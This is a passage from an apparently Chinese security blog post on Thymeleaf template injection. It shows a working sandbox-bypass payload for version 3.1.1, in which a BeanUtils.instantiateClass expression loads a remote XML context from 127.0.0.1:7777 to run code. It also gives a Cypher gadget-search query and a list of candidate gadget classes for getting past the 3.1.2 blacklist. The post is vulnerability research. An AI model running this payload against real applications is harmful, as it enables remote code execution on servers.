+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316231225450.png"
+	width="1195"
+	height="507"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316231225450_hudd13f1576c21cebb28cd22748992e262_90712_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240316231225450_hudd13f1576c21cebb28cd22748992e262_90712_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240316231225450"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="565px"
+	
+></p>
+<p><code>Thymeleaf 3.1.1</code> 版本增加了更多的黑名单</p>
+<p>用之前找到的 <code>org.springframework.beans.BeanUtils#instantiateClass</code> 构造 payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">T</span> <span style="color:#61afef;font-weight:bold">instantiateClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">ctor</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">...</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">BeanInstantiationException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">Assert</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">notNull</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ctor</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Constructor must not be null&#34;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">ReflectionUtils</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ctor</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">KotlinDetector</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isKotlinReflectPresent</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">KotlinDetector</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isKotlinType</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ctor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaringClass</span><span style="color:#56b6c2">()))</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#c678dd">return</span> <span style="color:#e06c75">KotlinDelegate</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">instantiateClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ctor</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">KotlinDelegate</span><span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">T</span> <span style="color:#61afef;font-weight:bold">instantiateClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Constructor</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">ctor</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">...</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">KFunction</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">kotlinConstructor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ReflectJvmMapping</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getKotlinFunction</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ctor</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">kotlinConstructor</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e06c75">ctor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">...</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><strong>payload</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#7f848e">&lt;!DOCTYPE HTML&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">html</span> <span style="color:#e06c75">lang</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;en&#34;</span> <span style="color:#e06c75">xmlns:th</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;http://www.thymeleaf.org&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;header&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#e06c75">h3</span>&gt;Spring Boot Web Thymeleaf Example&lt;/<span style="color:#e06c75">h3</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#e06c75">div</span> <span style="color:#e06c75">th:fragment</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>[[${T(org.springframework.beans.BeanUtils).instantiateClass(&#39;&#39;.getClass().forName(&#39;org.springframework.context.support.ClassPathXmlApplicationContext&#39;).getDeclaredConstructor(&#39;&#39;.class), &#39;http://127.0.0.1:7777/exp.xml&#39;)}]]
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#e06c75">html</span>&gt;
+</span></span></code></pre></div><h5 id="thymeleaf-312">Thymeleaf 3.1.2</h5>
+<p><strong>ExpressionUtils</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317163030456.png"
+	width="1201"
+	height="521"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317163030456_hue56a9b1b4ae7d3b6ec072a7988ab55ee_92843_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240317163030456_hue56a9b1b4ae7d3b6ec072a7988ab55ee_92843_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240317163030456"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="553px"
+	
+></p>
+<p>黑名单上了更多的类，继续用 Cypher 语句寻找目标</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cql" data-lang="cql"><span style="display:flex;"><span><span style="color:#e06c75">match</span> (<span style="color:#e06c75">source</span><span style="color:#e06c75">:Method</span> {<span style="color:#e06c75">IS_PUBLIC</span><span style="color:#e06c75">:true</span>, <span style="color:#e06c75">IS_STATIC</span><span style="color:#e06c75">:true</span>})  
+</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">where</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;java.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;javax.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;jakarta.&#39;</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;jdk.&#39;</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.ietf.jgss.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.omg.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.w3c.dom.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.xml.sax.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;com.sun.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;sun.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;com.squareup.javapoet.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;net.bytebuddy.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;net.sf.cglib.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;javassist.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;javax0.geci.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.apache.bcel.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.aspectj.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.javassist.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.mockito.&#34;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.objectweb.asm.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.objenesis.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.aot.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.asm.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.cglib.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.javapoet.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.objenesis.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.web.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.webflow.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.context.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.beans.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.aspects.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.aop.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.expression.&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">and</span> <span style="color:#c678dd">not</span>(<span style="color:#e06c75">source</span>.<span style="color:#e06c75">CLASSNAME</span> <span style="color:#e06c75">starts</span> <span style="color:#c678dd">with</span> <span style="color:#98c379">&#39;org.springframework.util.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">match</span> (<span style="color:#e06c75">sink</span><span style="color:#e06c75">:Method</span> {<span style="color:#e06c75">IS_SINK</span><span style="color:#e06c75">:true</span>})<span style="color:#56b6c2">&lt;-</span>[<span style="color:#e06c75">:CALL</span>]<span style="color:#56b6c2">-</span>(<span style="color:#e06c75">source</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">where</span> <span style="color:#e06c75">sink</span>.<span style="color:#e06c75">VUL</span> <span style="color:#c678dd">in</span> [<span style="color:#98c379">&#34;CODE&#34;</span>, <span style="color:#98c379">&#34;EXEC&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">return</span> <span style="color:#56b6c2">*</span>
+</span></span></code></pre></div><p>列出部分结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#56b6c2">//</span> <span style="color:#e06c75">forName</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">thymeleaf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ClassLoaderUtils</span><span style="color:#7f848e">#loadClass</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">el</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ReflectionUtil</span><span style="color:#7f848e">#forName</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">com</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fasterxml</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">jackson</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#7f848e">#versionFor</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">//</span> <span style="color:#e06c75">loadClass</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IntrospectionUtils</span><span style="color:#7f848e">#callMethod1</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logging</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">log4j</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LoaderUtil</span><span style="color:#7f848e">#loadClass</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">OptionHelper</span><span style="color:#7f848e">#instantiateByClassNameAndParameter</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Loader</span><span style="color:#7f848e">#loadClass</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">EnvUtil</span><span style="color:#7f848e">#isClassAvailable</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">com</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fasterxml</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">jackson</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">databind</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ClassUtil</span><span style="color:#7f848e">#getClassMethods</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ch</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">qos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logback</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Loader</span><span style="color:#7f848e">#loadClass</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">catalina</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Introspection</span><span style="color:#7f848e">#loadClass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">//</span> <span style="color:#e06c75">newInstance</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">com</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fasterxml</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">jackson</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">VersionUtil</span><span style="color:#7f848e">#versionFor</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">coyote</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ProtocolHandler</span><span style="color:#7f848e">#create</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">com</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fasterxml</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">jackson</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">databind</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ClassUtil</span><span style="color:#7f848e">#createInstance</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">springframework</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">CollectionFactory</span><span style="color:#7f848e">#createCollection</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">catalina</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">valves</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">rewrite</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">RewriteValve</span><span style="color:#7f848e">#parse</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">net</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">SSLImplementation</span><span style="color:#7f848e">#getInstance</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">tomcat</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">websocket</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Util</span><span style="color:#7f848e">#getDecoders</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">apache</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">logging</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">log4j</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">util</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">LoaderUtil</span><span style="color:#7f848e">#newInstanceOf</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">org</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">springframework</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">core</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">CollectionFactory</span><span style="color:#7f848e">#createMap</span>
